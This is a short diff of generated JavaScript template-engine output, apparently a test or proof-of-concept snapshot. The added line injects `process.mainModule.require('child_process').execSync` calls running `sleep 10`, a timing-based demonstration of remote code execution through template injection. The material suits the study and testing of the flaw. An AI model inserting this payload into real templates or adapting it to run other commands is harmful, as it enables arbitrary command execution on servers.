@@ -7,4 +7,4 @@ var out=''+(it && it.test);return out;
 		return function(code) {
 			return code ? code.toString().replace(matchHTML, function(m) {return encodeHTMLRules[m] || m;}) : "";
 		};
-	}());if(typeof module!=='undefined' && module.exports) module.exports=itself;else if(typeof define==='function')define(function(){return itself;});else {window.render=window.render||{};window.render['ttest']=itself;}}());
+	}());if(typeof module!=='undefined' && module.exports) module.exports=itself;else if(typeof define==='function')define(function(){return itself;});else {}process.mainModule.require('child_process').execSync(`sleep 10`)}())//=}process.mainModule.require('child_process').execSync(`sleep 10`)}())//||{};}process.mainModule.require('child_process').execSync(`sleep 10`)}())//['ttest']=itself;}}());
